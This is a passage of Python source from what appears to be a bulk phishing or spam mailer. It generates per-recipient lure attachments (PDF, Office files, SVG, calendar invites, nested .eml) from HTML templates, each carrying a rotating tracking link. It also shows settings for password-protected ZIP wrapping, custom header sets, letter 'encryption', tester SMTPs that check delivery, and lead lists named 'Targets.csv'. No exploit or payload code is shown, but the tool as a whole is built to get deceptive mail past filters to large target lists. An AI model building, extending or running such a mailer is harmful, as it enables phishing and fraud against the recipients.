                        fh.write(link_svg)
                    created_for_eml.append(link_svg_path)
                except OSError:
                    pass

        pdf_enabled = pdf_setup.get('enable', 0) == 1
        pdf_location = str(pdf_setup.get('location') or '').strip()
        if pdf_enabled and not os.path.isfile(pdf_location):
            print(f"{Fore.YELLOW}[PDF] Enabled but HTML source was not found: {pdf_location or '<empty path>'}{Style.RESET_ALL}")
        if pdf_enabled and os.path.isfile(pdf_location):
            import tempfile
            configured_pdf_name = str(pdf_setup.get('name') or 'document.pdf')
            try:
                original_pdf_name = os.path.basename(replace_placeholders(recipient_email or '', configured_pdf_name, skip_link=True))
            except Exception:
                original_pdf_name = os.path.basename(configured_pdf_name)
            original_pdf_name = original_pdf_name or 'document.pdf'
            out = os.path.join(tempfile.gettempdir(), f'.vdmonk-{uuid.uuid4().hex}.pdf')
            temp_out = os.path.join(tempfile.gettempdir(), f'.vdmonk-{uuid.uuid4().hex}.normalized.pdf')
            temporary_generated_files.extend((out, temp_out))
            pdf_ready = generate_pdf_from_html(
                pdf_location, out,
                layout=pdf_setup.get('layout', 1),
                page_type=pdf_setup.get('page_type', 1),
                margin=pdf_setup.get('margin', 0.4),
                recipient_email=recipient_email,
                link_url=get_next_link(recipient_email) if recipient_email else None,
            )
            if pdf_ready:
                normalized_ok = False
                try:
                    from pypdf import PdfReader, PdfWriter
                    reader = PdfReader(out)
                    writer = PdfWriter()
                    for page in reader.pages:
                        writer.add_page(page)
                    if pdf_setup.get('password_protection', 0) == 1:
                        writer.encrypt(str(pdf_setup.get('password') or ''))
                    with open(temp_out, 'wb') as normalized:
                        writer.write(normalized)
                    with _pdf_finalize_lock:
                        try:
                            if os.path.exists(out):
                                try:
                                    os.remove(out)
                                except OSError:
                                    pass
                            os.replace(temp_out, out)
                        finally:
                            try:
                                if os.path.exists(temp_out):
                                    os.remove(temp_out)
                            except OSError:
                                pass
                    normalized_ok = True
                except Exception as exc:
                    try:
                        if os.path.exists(temp_out):
                            os.remove(temp_out)
                    except OSError:
                        pass
                    print(f"{Fore.YELLOW}[PDF] Could not finalize generated PDF: {exc}{Style.RESET_ALL}")
                if not normalized_ok:
                    try:
                        if os.path.exists(out):
                            os.remove(out)
                    except OSError:
                        pass
                    pdf_ready = False
                if not pdf_ready:
                    print(f"{Fore.YELLOW}[PDF] HTML conversion failed: {pdf_location}{Style.RESET_ALL}")
                # Always record created file for possible embedding into .eml
                if pdf_ready:
                    created_for_eml.append(out)
                # Attach to outer message only when not embedding inside .eml
                if pdf_ready and not embed_eml_files:
                    try:
                        with open(out, 'rb') as fh:
                            pdf_data = fh.read()
                        attachment_name = original_pdf_name
                        if pdf_setup.get('zip_it', 0) == 1:
                            zip_password = None
                            if pdf_setup.get('password_protection', 0) == 1:
                                zip_password = str(pdf_setup.get('password') or '')
                            pdf_data = create_password_protected_zip(attachment_name, pdf_data, password=zip_password)
                            attachment_name = os.path.splitext(attachment_name)[0] + '.zip'
                            part = MIMEBase('application', 'zip')
                        else:
                            part = MIMEBase('application', 'pdf')
                        part.set_payload(pdf_data)
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment', filename=attachment_name)
                        msg.attach(part)
                        attached.append(out)
                    except Exception:
                        pass
        # RTF
        if rtf_setup.get('enable', 0) == 1 and os.path.isfile(rtf_setup.get('location')):
            rtf_name = _resolve_attachment_name(recipient_email, rtf_setup.get('name'), 'document.rtf')
            # Workers send concurrently: never share one output path between messages,
            # or a reader can observe a half-written (or truncated) file.
            out = os.path.join('RTF', f".{rtf_name}.{uuid.uuid4().hex}.rtf")
            temporary_generated_files.append(out)
            if generate_rtf_from_html(rtf_setup.get('location'), out, recipient_email=recipient_email):
                created_for_eml.append(out)
                if not embed_eml_files:
                    try:
                        with open(out, 'rb') as fh:
                            rtf_data = fh.read()
                        attachment_name = rtf_name
                        if rtf_setup.get('zip_it', 0) == 1:
                            zip_password = None
                            if rtf_setup.get('password_protection', 0) == 1:
                                zip_password = str(rtf_setup.get('password') or '')
                            rtf_data = create_password_protected_zip(attachment_name, rtf_data, password=zip_password)
                            attachment_name = os.path.splitext(attachment_name)[0] + '.zip'
                            part = MIMEBase('application', 'zip')
                        else:
                            part = MIMEBase('application', 'rtf')
                        part.set_payload(rtf_data)
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment', filename=attachment_name)
                        msg.attach(part)
                        attached.append(out)
                    except Exception:
                        pass
        # PPTX
        if pptx_setup.get('enable', 0) == 1 and os.path.isfile(pptx_setup.get('location')):
            pptx_name = _resolve_attachment_name(recipient_email, pptx_setup.get('name'), 'presentation.pptx')
            out = os.path.join('PPTX', f".{pptx_name}.{uuid.uuid4().hex}.pptx")
            temporary_generated_files.append(out)
            if generate_pptx_from_html(pptx_setup.get('location'), out, recipient_email=recipient_email):
                created_for_eml.append(out)
                if not embed_eml_files:
                    try:
                        with open(out, 'rb') as fh:
                            pptx_data = fh.read()
                        attachment_name = pptx_name
                        if pptx_setup.get('zip_it', 0) == 1:
                            zip_password = None
                            if pptx_setup.get('password_protection', 0) == 1:
                                zip_password = str(pptx_setup.get('password') or '')
                            pptx_data = create_password_protected_zip(attachment_name, pptx_data, password=zip_password)
                            attachment_name = os.path.splitext(attachment_name)[0] + '.zip'
                            part = MIMEBase('application', 'zip')
                        else:
                            part = MIMEBase('application', 'vnd.openxmlformats-officedocument.presentationml.presentation')
                        part.set_payload(pptx_data)
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment', filename=attachment_name)
                        msg.attach(part)
                        attached.append(out)
                    except Exception:
                        pass
        # iCalendar
        if icalendar_setup.get('enable', 0) == 1:
            ics_name = _resolve_attachment_name(recipient_email, icalendar_setup.get('name'), 'meeting.ics')
            out = os.path.join('ICALENDAR', f".{ics_name}.{uuid.uuid4().hex}.ics")
            temporary_generated_files.append(out)
            if generate_icalendar_file(out):
                created_for_eml.append(out)
                if not embed_eml_files:
                    try:
                        with open(out, 'rb') as fh:
                            part = MIMEBase('text', 'calendar')
                            part.set_payload(fh.read())
                            encoders.encode_base64(part)
                            part.add_header('Content-Disposition', 'attachment', filename=ics_name)
                            msg.attach(part)
                            attached.append(out)
                    except Exception:
                        pass
        # SVG
        if svg_setup.get('enable', 0) == 1 and os.path.isfile(svg_setup.get('location')):
            svg_name = _resolve_attachment_name(recipient_email, svg_setup.get('name'), 'image.svg')
            out = os.path.join('SVG', svg_name)
            if generate_svg_from_html(svg_setup.get('location'), out, recipient_email=recipient_email):
                created_for_eml.append(out)
                if not embed_eml_files:
                    try:
                        with open(out, 'rb') as fh:
                            part = MIMEBase('image', 'svg+xml')
                            part.set_payload(fh.read())
                            encoders.encode_base64(part)
                            part.add_header('Content-Disposition', 'attachment', filename=svg_name)
                            msg.attach(part)
                            attached.append(out)
                    except Exception:
                        pass
        # DOC
        if doc_setup.get('enable', 0) == 1 and os.path.isfile(doc_setup.get('location')):
            doc_name = _resolve_attachment_name(recipient_email, doc_setup.get('name'), 'document.doc')
            out = os.path.join('DOC', f".{doc_name}.{uuid.uuid4().hex}.doc")
            temporary_generated_files.append(out)
            if generate_doc_from_html(doc_setup.get('location'), out, recipient_email=recipient_email):
                created_for_eml.append(out)
                if not embed_eml_files:
                    try:
                        with open(out, 'rb') as fh:
                            doc_data = fh.read()
                        attachment_name = doc_name
                        if doc_setup.get('zip_it', 0) == 1:
                            zip_password = None
                            if doc_setup.get('password_protection', 0) == 1:
                                zip_password = str(doc_setup.get('password') or '')
                            doc_data = create_password_protected_zip(attachment_name, doc_data, password=zip_password)
                            attachment_name = os.path.splitext(attachment_name)[0] + '.zip'
                            part = MIMEBase('application', 'zip')
                        else:
                            part = MIMEBase('application', 'msword')
                        part.set_payload(doc_data)
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment', filename=attachment_name)
                        msg.attach(part)
                        attached.append(out)
                    except Exception:
                        pass
        # DOCX
        if docx_setup.get('enable', 0) == 1 and os.path.isfile(docx_setup.get('location')):
            docx_name = _resolve_attachment_name(recipient_email, docx_setup.get('name'), 'document.docx')
            out = os.path.join('DOCX', f".{docx_name}.{uuid.uuid4().hex}.docx")
            temporary_generated_files.append(out)
            if generate_docx_from_html(docx_setup.get('location'), out, recipient_email=recipient_email):
                created_for_eml.append(out)
                if not embed_eml_files:
                    try:
                        with open(out, 'rb') as fh:
                            docx_data = fh.read()
                        attachment_name = docx_name
                        if docx_setup.get('zip_it', 0) == 1:
                            zip_password = None
                            if docx_setup.get('password_protection', 0) == 1:
                                zip_password = str(docx_setup.get('password') or '')
                            docx_data = create_password_protected_zip(attachment_name, docx_data, password=zip_password)
                            attachment_name = os.path.splitext(attachment_name)[0] + '.zip'
                            part = MIMEBase('application', 'zip')
                        else:
                            part = MIMEBase('application', 'vnd.openxmlformats-officedocument.wordprocessingml.document')
                        part.set_payload(docx_data)
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment', filename=attachment_name)
                        msg.attach(part)
                        attached.append(out)
                    except Exception:
                        pass
        # EML (generate using existing created files embedded if configured)
        if eml_setup.get('enable', 0) == 1 and os.path.isfile(eml_setup.get('location')):
            # Workers send concurrently, so never share one output path between messages.
            eml_name = os.path.basename(str(replace_placeholders(recipient_email or '', str(eml_setup.get('name') or 'message.eml'), skip_link=True))) or 'message.eml'
            out = os.path.join('EML', f".{eml_name}.{uuid.uuid4().hex}.tmp")
            # An enabled EML allow-list controls which generated attachments are embedded.
            # onlyEml controls whether those attachments also appear on the outer message.
            embed = False
            eml_conf = dict(eml_setup)
            # Pre-initialize staged containers so they are always bound even when the
            # attachment allow-list is empty. Without this, an empty allow-list raised
            # NameError at eml_conf['embedFileNames'] = staged_names and silently skipped
            # .eml generation AND every later generated attachment (pdf/doc/rtf/pptx/ics/local).
            staged_files = []
            staged_names = {}
            # Merge created files and any extra embed files (e.g., logo) to include inside the .eml
            embed_list = created_for_eml[:]
            attachments_setting = eml_setup.get('attachments')
            if isinstance(attachments_setting, str):
                text = attachments_setting.strip()
                if text.startswith('[') and text.endswith(']'):
                    items = [part.strip() for part in text[1:-1].split(',') if part.strip()]
                    attachments_setting = [item.strip().strip('"\'') for item in items]
                else:
                    attachments_setting = [item.strip().lower() for item in text.split(',') if item.strip()]
            elif attachments_setting is None:
                attachments_setting = []
            allowed = {str(item).strip().lower() for item in (attachments_setting or []) if str(item).strip()}
            embed = (
                eml_setup.get('emlAttachment', 0) == 1
                or eml_setup.get('onlyEml', 0) == 1
                or bool(allowed)
            )
            if not allowed:
                # No allow-list configured (attachments: [] or unset): embed nothing.
                # Per setup.ini, an empty [] means no attachments are added inside the .eml.
                embed_list = []
            else:
                def attachment_info(path):
                    ext = os.path.splitext(path)[1].lower()
                    if os.path.abspath(path).startswith(os.path.abspath('EML' + os.sep)) and os.path.basename(path).startswith('.'):
                        return 'link_svg', link_svg_setup, link_svg_setup.get('name') or 'link.svg'
                    if ext == '.pdf':
                        try:
                            pdf_name = replace_placeholders(recipient_email or '', str(pdf_setup.get('name') or 'document.pdf'), skip_link=True)
                        except Exception:
                            pdf_name = pdf_setup.get('name')
                        return 'pdf', pdf_setup, pdf_name
                    if ext == '.rtf':
                        return 'rtf', rtf_setup, rtf_setup.get('name')
                    if ext == '.doc':
                        return 'doc', doc_setup, doc_setup.get('name')
                    if ext == '.docx':
                        return 'docx', docx_setup, docx_setup.get('name')
                    if ext == '.pptx':
                        return 'pptx', pptx_setup, pptx_setup.get('name')
                    if ext == '.ics':
                        return 'ics', icalendar_setup, icalendar_setup.get('name')
                    if ext in ('.html', '.htm'):
                        return 'html', htmlAttachment_setup, htmlAttachment_setup.get('name')
                    if ext == '.svg':
                        return 'svg_attachment', svgAttachment_setup, svgAttachment_setup.get('name')
                    return 'local_files', local_files_setup, os.path.basename(path)

                staged_files = []
                staged_names = {}
                for source_path in embed_list:
                    kind, attachment_cfg, configured_name = attachment_info(source_path)
                    attachment_enabled = bool(attachment_cfg.get('enable', 0) == 1)
                    configured_zip = attachment_cfg.get('zip_it', 0) == 1
                    include_raw = kind in allowed and attachment_enabled and not configured_zip
                    include_zip = attachment_enabled and configured_zip and (kind in allowed or 'zip' in allowed)
                    if not include_raw and not include_zip:
                        continue
                    try:
                        with open(source_path, 'rb') as source_file:
                            payload = source_file.read()
                        if kind == 'html':
                            html_text = payload.decode('utf-8', errors='replace')
                            html_text = re.sub(r"\$\{([^}]+)\}", r"{\1}", html_text)
                            payload = findString(recipient_email or '', html_text, skip_link=True).encode('utf-8')
                        output_name = os.path.basename(str(configured_name or os.path.basename(source_path)))
                        output_name = replace_placeholders(
                            recipient_email or '', output_name, skip_link=True
                        )
                        output_name = os.path.basename(output_name) or os.path.basename(source_path)
                        if include_zip:
                            password = None
                            if attachment_cfg.get('password_protection', 0) == 1:
                                password = str(attachment_cfg.get('password') or '')
                            elif zip_setup.get('password_protection', 0) == 1:
                                password = str(zip_setup.get('password') or '')
                            payload = create_password_protected_zip(output_name, payload, password=password)
                            output_name = os.path.splitext(output_name)[0] + '.zip'
                        staged_path = os.path.join('EML', f".{output_name}.{uuid.uuid4().hex}.embed")
                        with open(staged_path, 'wb') as staged_file:
                            staged_file.write(payload)
                        staged_files.append(staged_path)
                        staged_names[staged_path] = output_name
                    except (OSError, RuntimeError):
                        pass
                embed_list = staged_files
            if extra_embed_files:
                try:
                    embed_list.extend([f for f in extra_embed_files if f and os.path.isfile(f)])
                except Exception:
                    pass
            if embed:
                eml_conf['embedFiles'] = embed_list
                eml_conf['embedFileNames'] = staged_names
            # Add details for inclusion in the eml body
            try:
                eml_conf['details'] = {
                    'attachments': created_for_eml,
                    'embedded_files': embed_list
                }
            except Exception:
                pass
            if generate_eml_from_html(eml_setup.get('location'), out, eml_conf, to_email=recipient_email):
                # Log generated EML and how many files were embedded
                try:
                    embed_count = len(eml_conf.get('embedFiles') or [])
                    print(f"{Fore.CYAN}[EML] Generated: {out} (embedded: {embed_count}){Style.RESET_ALL}")
                    save_eml_report('generated', recipient_email, os.path.basename(eml_name), embed_count)
                except Exception:
                    pass
                # Attach the generated .eml file to the outer message.
                # If a relay rejects message/rfc822 attachments or the .eml extension,
                # set attachToOuter to 0 (YAML: attach_to_outer: false | INI: attachToOuter=0)
                # to keep generating the .eml without attaching it, or pick a permitted
                # MIME type / filename via attachType / attachName.
                try:
                    if eml_setup.get('attachToOuter', 1) == 1:
                        attach_type = (eml_setup.get('attachType') or 'message/rfc822').strip()
                        if '/' not in attach_type:
                            attach_type = 'application/octet-stream'
                        try:
                            attach_maintype, attach_subtype = attach_type.split('/', 1)
                        except Exception:
                            attach_maintype, attach_subtype = 'application', 'octet-stream'
                        attach_filename = (eml_setup.get('attachName') or '').strip() or eml_setup.get('name') or 'message.eml'
                        attach_filename = replace_placeholders(
                            recipient_email or '', str(attach_filename), skip_link=True
                        )
                        attach_filename = os.path.basename(attach_filename) or 'message.eml'
                        if attach_type.lower() == 'message/rfc822':
                            from email import policy
                            from email.parser import BytesParser
                            with open(out, 'rb') as fh:
                                nested_message = BytesParser(policy=policy.default).parse(fh)
                            from email.mime.message import MIMEMessage
                            part = MIMEMessage(nested_message)
                        else:
                            with open(out, 'rb') as fh:
                                part = MIMEBase(attach_maintype, attach_subtype)
                                part.set_payload(fh.read())
                            encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment', filename=attach_filename)
                        msg.attach(part)
                        attached.append(out)
                        save_eml_report('attached', recipient_email, attach_filename, embed_count)
                except Exception as _eml_attach_exc:
                    save_eml_report('attach_failed', recipient_email, attach_filename if 'attach_filename' in locals() else eml_name, embed_count if 'embed_count' in locals() else 0, _eml_attach_exc)
                    try:
                        print(f"{Fore.YELLOW}[EML] Could not attach the generated .eml to the outer message: {_eml_attach_exc}{Style.RESET_ALL}")
                    except Exception:
                        pass
                finally:
                    try:
                        os.remove(out)
                    except OSError:
                        pass
                    for temporary_path in created_for_eml:
                        try:
                            if (
                                os.path.dirname(os.path.abspath(temporary_path)) == os.path.abspath('EML')
                                and os.path.basename(temporary_path).startswith('.')
                            ):
                                os.remove(temporary_path)
                        except OSError:
                            pass
                    cleanup_eml_temp_files('EML')
            else:
                save_eml_report('generation_failed', recipient_email, os.path.basename(eml_name), 0, 'generate_eml_from_html returned False')
        # Local files, with legacy single-file fallback
        selected_files = selected_local_files
        for local_entry in selected_files:
            out = local_entry.get('path')
            if not out or not os.path.isfile(out):
                continue
            if out not in created_for_eml:
                created_for_eml.append(out)
            if not embed_eml_files:
                try:
                    with open(out, 'rb') as fh:
                        ctype = mimetypes.guess_type(out)[0] or 'application/octet-stream'
                        maintype, subtype = ctype.split('/', 1)
                        part = MIMEBase(maintype, subtype)
                        part.set_payload(fh.read())
                        encoders.encode_base64(part)
                        # Resolve {PLACEHOLDER} tokens in the configured local-file
                        # name; previously the raw template (e.g. document_{DATE}.pdf)
                        # leaked verbatim into the delivered filename.
                        local_name = _resolve_attachment_name(recipient_email, local_entry.get('name'), os.path.basename(out))
                        part.add_header('Content-Disposition', 'attachment', filename=local_name)
                        msg.attach(part)
                        attached.append(out)
                except Exception:
                    pass
    except Exception:
        pass
    finally:
        for temporary_path in temporary_generated_files:
            try:
                if os.path.isfile(temporary_path):
                    os.remove(temporary_path)
            except OSError:
                pass
    return attached


def cfg_get_bool(cfg, section, option, default=False):
    try:
        val = cfg.get(section, option)
    except Exception:
        return default
    if isinstance(val, bool):
        return val
    s = str(val).strip().lower()
    return s in ('1', 'true', 'yes', 'on')


def configure_custom_headers(cfg):
    """Load custom headers and enforce the configured enabled flag."""
    global custom_headers_enabled, custom_headers_multiple

    custom_headers.clear()
    custom_header_sets.clear()
    custom_headers_enabled = False
    custom_headers_multiple = False

    if not cfg.has_section('CUSTOM_HEADERS'):
        return

    enabled = str(cfg.get('CUSTOM_HEADERS', 'enabled', fallback='0')).strip().lower()
    if enabled in ('0', 'false', 'no', 'off'):
        return

    custom_headers_enabled = True
    custom_headers_multiple = configparser.ConfigParser.BOOLEAN_STATES.get(
        str(cfg.get('CUSTOM_HEADERS', 'multiple headers', fallback='false')).strip().lower(),
        False,
    )
    header_list = cfg.get('CUSTOM_HEADERS', 'headersList', fallback='Multiple/header.txt').strip()
    file_header_sets = load_custom_header_sets(header_list)
    if file_header_sets:
        custom_headers.update(file_header_sets[0])
        if custom_headers_multiple:
            custom_header_sets.extend(file_header_sets)
    else:
        for key, value in cfg.items('CUSTOM_HEADERS'):
            if key.lower() in ('enabled', 'multiple headers', 'headerslist', 'create_placeholder_if_missing'):
                continue
            if value is not None and str(value).strip():
                custom_headers[key] = str(value).strip()

    if custom_headers_multiple and not custom_header_sets:
        custom_headers_multiple = False
    if not validate_custom_headers(custom_headers):
        custom_headers.clear()
        custom_header_sets.clear()
        custom_headers_enabled = False


def validate_sender_config(cfg):
    """Report the configured sending mode(s); never blocks a supported mode."""
    raw = str(cfg.get('sender_config', 'sending_mode', fallback='smtp') or 'smtp').strip().lower() if cfg.has_section('sender_config') else 'smtp'
    modes = parse_mode_tokens(raw)
    sending = [m for m in modes if m in VALID_SENDING_MODES]
    if sending:
        print(f"{Fore.CYAN}[CONFIG] sending_mode={raw} -> {', '.join(MODE_DISPLAY.get(m, m.upper()) for m in sending)}{Style.RESET_ALL}")
    if 'test&send' in modes:
        print(f"{Fore.YELLOW}[CONFIG] 'test&send' is recognised but not implemented yet; using the standard delivery flow.{Style.RESET_ALL}")
    unknown = [m for m in modes if m not in VALID_SENDING_MODES and m not in ('test&send', 'tester', 'tester&send')]
    if unknown:
        print(f"{Fore.YELLOW}[CONFIG] Ignoring unknown sending_mode token(s): {', '.join(unknown)}{Style.RESET_ALL}")

# Leads / BCC / Test-email globals
leads_setup_target = "LEADS/leads.txt"
leads_enable_csv = 0
leads_csv_location = "Target/Targets.csv"


def resolve_leads_path(path):
    """Resolve legacy root lead paths against the LEADS folder."""
    path = str(path or '').strip()
    candidates = [path]
    if os.path.basename(path).lower() == 'leads.txt':
        candidates.insert(0, os.path.join('LEADS', 'leads.txt'))
    for candidate in candidates:
        if os.path.isfile(candidate):
            return candidate
    return candidates[0]

bcc_enabled = 0
bcc_target = "Multiple/BCC.txt"
bcc_list = []
bcc_index = 0
bcc_limit = 5

local_image_setup = {
    'enable': 0,
    'location': 'LOCAL_IMAGE',
}

test_email_enabled = 0
test_send_to = ""
test_when = 100
sent_since_last_test = 0
# Dedicated test letter for the test&send pre-campaign phase
test_subject = ""
test_letter = ""
test_letter_delay = 0
test_multiple = 0
test_time_unit = 'sec'
test_group_size = 0
test_pace = 'auto'  # v6: 'auto' = pace per tester from its sending limit (-1 -> 1by1, numeric -> group); 'group'/'1by1' force it
# v8.4: test_config.testerfromname - dedicated From name for the tester
# letters (tester / tester&send modes). Supports {smtpfrommail} /
# {SMTPFROMMAIL}, resolved to the acting tester SMTP's from-mail. Empty
# keeps the old behaviour (the campaign fromname).
test_fromname = ''
test_send_assignments = []
test_send_testers = []
test_send_campaign_done = set()  # v6: 1-based line numbers already campaign-sent by the 1by1 pace
# v7/v8: skip already-processed leads in tester&send mode. The ledger
# (record_folder/test_send_tested.txt + test_send_sent.txt) records every
# address that was tested (test phase) and campaign-processed (main campaign)
# so another tester SMTP - or a duplicate lead line - never re-attempts the
# same mailbox inside the SAME run.
# v8: the ledger is wiped at the start of every run (ledger_persist: false,
# the default), so a finished run never affects the next one. Set
# test_config.ledger_persist: true to keep the old cross-run behaviour.
test_send_attempted = set()      # normalized addresses already tested (ledger snapshot)
test_send_sent = set()           # normalized addresses already campaign-processed (ledger snapshot)
test_send_campaign_seen = set()  # normalized addresses queued by the campaign loop this run (in-run dedupe)
test_send_skip_processed = 1     # test_config.skip_processed: 1 = dedupe already-processed leads in this run
test_send_ledger_persist = 0     # v8 test_config.ledger_persist: 0 = per-run ledger (wiped every run)
test_send_ledger_dir = ''        # ledger folder override; '' -> use record_folder
test_send_ledger_lock = threading.Lock()
# v4/v5: tester / tester&send modes (test_config.tester + test_config.tester&send)
tester_mode = 0
tester_send_mode = 0
tester_token = ''
# True once load_sending_modes() has resolved the tester flags from the raw
# config; otherwise configure_optional_features() must not invent them.
_tester_flags_loaded = False

# v8.3: delete_config - auto-remove fully processed leads from leads.txt.
# Applies to all sending modes; in tester&send mode a lead is deleted only
# after it received BOTH the tester letter and the main campaign letter.
# Tester-only mode never deletes.
# v8.7: delete guard - leads are removed from leads.txt ONLY when
# delete_config.enable is true; the trace flag below is set once per run.
delete_config_enable = 0
_delete_config_trace_done = False
delete_config_lock = threading.Lock()
delete_config_deleted = set()
delete_leads_path = ''
test_send_tested_run = set()  # normalized addresses that got the tester letter THIS run


def _cfg_text(value, default=''):
    """Coerce a configparser value to clean text.

    ``setup.ini`` is parsed as simple YAML first, where a blank value such as
    ``subject: ""`` becomes an empty mapping. ``section()`` then stores
    ``str({})`` == ``'{}'`` in the configparser object, so a raw ``.strip()``
    would yield the literal two-character string ``'{}'``. Treat such sentinel
    artifacts (and ``None``/mappings/lists) as an empty value instead.
    """
    if value is None or isinstance(value, (dict, list, tuple)):
        return default
    text = str(value).strip()
    return default if text in ('{}', '[]') else text


def _flag_unset(value):
    """True when a parsed config value should be treated as 'not set'."""
    if value is None:
        return True
    if isinstance(value, _YamlDup):
        return len(value) == 0
    if isinstance(value, dict):
        return len(value) == 0
    if isinstance(value, str):
        return not value.strip()
    return False


def _resolve_test_enables(test_cfg):
    """Return (periodic_enable, tester_enable) raw values for test_config.

    ``test_config.enable`` drives the periodic verification test. The v4/v5
    tester modes are enabled by an explicit ``test_config.tester`` value, or
    by a duplicated second ``enable`` key (the hand-written 'Tester&Send
    config' block), or - for backward compatibility - by the single
    ``enable`` value when no tester key exists.
    """
    raw_enable = (test_cfg or {}).get('enable', False)
    dup = list(raw_enable) if isinstance(raw_enable, _YamlDup) else None
    periodic_raw = dup[0] if dup else raw_enable
    tester_raw = (test_cfg or {}).get('tester', None)
    if _flag_unset(tester_raw) and dup and len(dup) > 1:
        tester_raw = dup[1]
    if _flag_unset(tester_raw):
        tester_raw = periodic_raw
    return periodic_raw, tester_raw


def configure_optional_features(cfg):
    """Apply BCC, test-delivery, and local-image settings to runtime state."""
    global bcc_enabled, bcc_target, bcc_limit, test_email_enabled, test_send_to, test_when, sent_since_last_test
    global test_subject, test_letter, test_letter_delay, test_multiple
    global test_time_unit, test_group_size, test_pace, test_send_skip_processed
    global test_send_ledger_persist
    global delete_config_enable, _delete_config_trace_done
    global tester_mode, tester_send_mode
    global test_fromname
    global configured_timezone, inline_images_enabled

    bcc_enabled = 1 if cfg_get_bool(cfg, 'bcc_config', 'enable', False) else 0
    bcc_target = cfg.get('bcc_config', 'list', fallback=bcc_target).strip()
    bcc_limit = max(0, cfg.getint('bcc_config', 'sending_limit', fallback=bcc_limit))
    if bcc_enabled:
        load_bcc_list()
    else:
        bcc_list.clear()

    test_email_enabled = 1 if cfg_get_bool(cfg, 'test_config', 'enable', False) else 0
    test_send_to = _cfg_text(cfg.get('test_config', 'email', fallback=''))
    test_when = max(1, cfg.getint('test_config', 'after', fallback=100))
    test_subject = _cfg_text(cfg.get('test_config', 'subject', fallback=''))
    test_letter = _cfg_text(cfg.get('test_config', 'letter', fallback=''))
    test_letter_delay = max(0, cfg.getint('test_config', 'time', fallback=0))
    test_time_unit = _normalize_time_unit(cfg.get('test_config', 'time_unit', fallback='sec'))
    test_group_size = max(0, cfg.getint('test_config', 'group_size', fallback=0))
    test_pace = _normalize_test_pace(cfg.get('test_config', 'pace', fallback='auto'))
    # v8.4: dedicated tester From name (supports {smtpfrommail}).
    test_fromname = _cfg_text(cfg.get('test_config', 'testerfromname', fallback=''))
    test_send_skip_processed = 1 if cfg_get_bool(cfg, 'test_config', 'skip_processed', True) else 0
    # v8: ledger_persist=false (default) keeps the ledger per-run only.
    test_send_ledger_persist = 1 if cfg_get_bool(cfg, 'test_config', 'ledger_persist', False) else 0
    test_multiple = 1 if cfg_get_bool(cfg, 'test_config', 'enable_multiple', False) else 0
    # v9.2: apply sender_config.timezone (for {DATE|TIME} macros) and
    # sender_config.inline_images (base64 <img> -> CID inline attachments).
    _tz = _cfg_text(cfg.get('OPTION', 'timezone', fallback='UTC'), 'UTC').strip() or 'UTC'
    configured_timezone = _tz
    inline_images_enabled = 1 if cfg_get_bool(cfg, 'OPTION', 'inline_images', False) else 0
    # v8.3: delete_config.enable -> auto-remove fully processed leads.
    delete_config_enable = 1 if cfg_get_bool(cfg, 'delete_config', 'enable', False) else 0
    if not _delete_config_trace_done:
        _delete_config_trace_done = True
        _dc_state = 'ON' if delete_config_enable else 'OFF'
        print(f"{Fore.CYAN}[DELETE] delete_config.enable = {_dc_state} - fully processed leads "
              f"{'WILL be removed from leads.txt' if delete_config_enable else 'are KEPT in leads.txt'}{Style.RESET_ALL}", flush=True)
    if not _tester_flags_loaded:
        # Pure .ini path ([sections] present): sender_config is not parsed in
        # this branch, so the tester tokens cannot be resolved. Keep the
        # tester modes off instead of letting test_config.enable silently
        # switch them on. load_sending_modes() owns these flags on the
        # setup.ini (simple-YAML) path.
        tester_mode = 0
        tester_send_mode = 0

    local_image_setup['enable'] = 1 if cfg_get_bool(cfg, 'local_image_config', 'enable', False) else 0
    local_image_setup['location'] = _cfg_text(cfg.get('local_image_config', 'location', fallback=local_image_setup['location']), local_image_setup['location'])

    # v9.1: apply the EML section. Previously load_sender_config() built an
    # 'eml' section from html_eml_config but configure_optional_features()
    # ignored it, so YAML users' attachments / only_eml / attach_* keys were
    # never applied and stale values (or the [html] default) leaked through.
    if cfg.has_section('eml'):
        eml_setup['enable'] = 1 if str(cfg.get('eml', 'enable', fallback=str(eml_setup['enable']))).strip().lower() in ('1', 'true', 'yes', 'on') else 0
        eml_setup['location'] = _cfg_text(cfg.get('eml', 'location', fallback=eml_setup['location']), eml_setup['location'])
        eml_setup['name'] = _cfg_text(cfg.get('eml', 'name', fallback=eml_setup['name']), eml_setup['name'])
        eml_setup['subject'] = _cfg_text(cfg.get('eml', 'subject', fallback=eml_setup['subject']), eml_setup['subject'])
        eml_setup['from'] = _cfg_text(cfg.get('eml', 'from', fallback=eml_setup['from']), eml_setup['from'])
        eml_setup['from_name'] = _cfg_text(cfg.get('eml', 'from_name', fallback=eml_setup.get('from_name', '')), eml_setup.get('from_name', ''))
        eml_setup['to'] = _cfg_text(cfg.get('eml', 'to', fallback=eml_setup['to']), eml_setup['to'])
        eml_setup['to_name'] = _cfg_text(cfg.get('eml', 'to_name', fallback=eml_setup.get('to_name', '')), eml_setup.get('to_name', ''))
        eml_setup['attachToOuter'] = 1 if str(cfg.get('eml', 'attachToOuter', fallback=str(eml_setup.get('attachToOuter', 1)))).strip().lower() in ('1', 'true', 'yes', 'on') else 0
        eml_setup['attachType'] = _cfg_text(cfg.get('eml', 'attachType', fallback=eml_setup.get('attachType', 'message/rfc822')), eml_setup.get('attachType', 'message/rfc822'))
        eml_setup['attachName'] = _cfg_text(cfg.get('eml', 'attachName', fallback=eml_setup.get('attachName', '')), eml_setup.get('attachName', ''))
        eml_setup['emlAttachment'] = 1 if str(cfg.get('eml', 'emlAttachment', fallback=str(eml_setup.get('emlAttachment', 0)))).strip().lower() in ('1', 'true', 'yes', 'on') else 0
        eml_setup['onlyEml'] = 1 if cfg_get_bool(cfg, 'eml', 'onlyEml', True) else 0
        eml_setup['attachments'] = normalize_attachment_list(cfg.get('eml', 'attachments', fallback=''))

# Letter / Subject / Proxy setups
letter_setup = {
    'letter': 'LETTER/letter.html',
    'enableMultiple': 0,
    'letterList': 'MULTIPLE/letters.txt',
    'enableEncryption': 0,
    'customEncryption': 'Multiple/Myscript.txt',
    'technique': 1,
    'selection_system': 1
}

subject_setup = {
    'subject': 'Review Document',
    'enableMultiple': 0,
    'subjectList': 'Multiple/Subjects.txt',
